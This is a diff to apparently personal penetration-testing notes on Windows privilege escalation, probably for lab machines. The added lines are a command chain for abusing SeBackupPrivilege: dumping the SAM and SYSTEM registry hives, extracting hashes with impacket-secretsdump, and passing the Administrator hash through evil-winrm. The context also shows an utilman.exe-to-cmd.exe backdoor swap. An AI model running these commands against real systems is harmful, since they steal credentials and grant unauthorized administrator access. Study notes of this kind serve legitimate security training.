@@ -21,6 +21,26 @@ C:\Windows\System32\> copy cmd.exe utilman.exe
 ```
 go to lock screen
 
+`SebackupUpPrivilege`
+```powershell
+reg save HKLM\SYSTEM SYSTEM.SAV
+reg save HKLM\SAM SAM.SAV 
+
+download SYSTEM.SAV
+download SAM.SAV
+```
+extract secrets
+```bash
+impacket-secretsdump -sam SAM.SAV -system SYSTEM.SAV LOCAL
+```
+get Administrator hash, log in using it:
+```bash
+evil-winrm -i 10.129.128.107 -u Administrator -H <nt hash>
+```
+
+
+
+
 https://lolbas-project.github.io/#
 ## winpease util
 https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
